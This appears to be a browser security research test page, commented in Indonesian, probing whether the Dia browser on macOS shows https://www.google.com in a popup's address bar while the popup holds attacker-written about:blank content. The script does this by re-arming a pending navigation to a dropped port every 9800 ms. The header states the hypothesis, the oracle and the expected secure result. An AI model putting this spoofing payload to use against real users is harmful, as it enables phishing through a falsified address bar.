<!-- SF-DIA-03 | GENOME A=dead-port(DROP)+arm-ulang B=window.open('')+location.replace C=setInterval 9800ms D=S1 bar-jendela E=- F=document.write G=desktop-popup-custom-size X=dia-macos
     GROUNDING: lanjutan langsung CVE-2025-15032. Fix meng-PIN tampilan bar ke about:blank untuk jendela custom-size.
                Tapi "about:blank sudah COMMIT" dan "ada navigasi PENDING ke URL lain" adalah DUA STATE BERBEDA.
                Yang diuji: apakah pin itu juga berlaku saat ada navigasi menggantung.
     PREDIKAT : bar jendela kecil menulis https://www.google.com sementara isinya dokumen about:blank tulisan penyerang.
     ORACLE   : Run 03 -> tunggu 2 detik -> baca bar jendela kecil. Sama = spoof. about:blank / origin induk = aman.
     EXPECTED-SECURE: bar tetap about:blank (atau origin induk) selama commit belum datang.
     KONTROL  : 00-control.html (port 443 hidup -> commit datang -> dokumen tertimpa halaman Google asli).
     KNOB     : interval 9800 ms = tepat SEBELUM timeout jaringan ~10 s, jadi pending selalu di-arm ulang sebelum
                error page sempat commit. Port 9090 harus DI-DROP; kalau error page instan, ganti 8443/8080/82.
     STATUS   : HIPOTESIS - belum diuji di Dia. -->
<meta charset="utf-8"><title>03 pending URL vs about:blank pin</title>
<h3>03 &mdash; navigasi PENDING di jendela yang bar-nya sudah di-pin</h3>
<button onclick="run()">Run 03</button>
<pre id="p"></pre>
<script>
var T = 'https://www.google.com:9090/';
document.getElementById('p').textContent =
  'REAL origin : ' + location.origin + '\nREAL href   : ' + location.href;
function run(){
  var w = window.open('', '', 'width=480,height=620,left=200,top=120');
  w.document.write('<h3>Ini BUKAN www.google.com &mdash; ditulis oleh ' + location.origin + '</h3>');
  setInterval(function(){ w.location.replace(T); }, 9800);
}
</script>
